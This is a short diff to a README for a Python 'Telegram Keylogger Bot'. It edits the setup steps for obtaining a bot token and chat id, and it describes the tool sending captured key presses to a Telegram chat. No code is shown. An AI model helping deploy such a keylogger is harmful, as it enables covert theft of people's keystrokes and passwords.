@@ -19,7 +19,7 @@ The Telegram Keylogger Bot is a Python script that leverages the Telegram Bot AP
    pip install keyboard telepot
    ```
 
-- Set up a Telegram bot and obtain the API token.
+- Set up a Telegram bot and obtain the API token and get the chat id of the group chat.
 
 - Replace the TOKEN and CHAT_ID values in the script with your own bot's API token and desired chat ID.
 
@@ -29,7 +29,7 @@ The Telegram Keylogger Bot is a Python script that leverages the Telegram Bot AP
   python keyboard_bot.py
   ```
   
--) The keylogger will capture key presses and send them to the specified Telegram chat.
+- The keylogger will capture key presses and send them to the specified Telegram chat.
 
 <h2 align="center">Disclaimer</h2>
 This script is intended for educational and ethical purposes only. The developer assumes no responsibility for any unauthorized or malicious use of this tool.
